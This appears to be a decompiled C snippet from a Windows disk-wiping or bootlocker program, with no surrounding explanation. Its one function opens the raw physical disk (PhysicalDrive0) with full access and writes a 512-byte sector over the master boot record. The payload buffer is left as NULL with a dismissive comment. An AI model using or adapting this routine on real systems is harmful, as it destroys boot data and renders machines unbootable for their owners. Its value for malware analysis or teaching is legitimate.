#include <windows.h>

__int64 sub_140001110()
{
	HANDLE v0; // rbx
	DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-18h]

	v0 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0i64, 3u, 0, 0i64);
	WriteFile(v0, NULL/*binary, it doesnt matter*/, 0x200u, &NumberOfBytesWritten, 0i64);
	CloseHandle(v0);
	return 1;
}
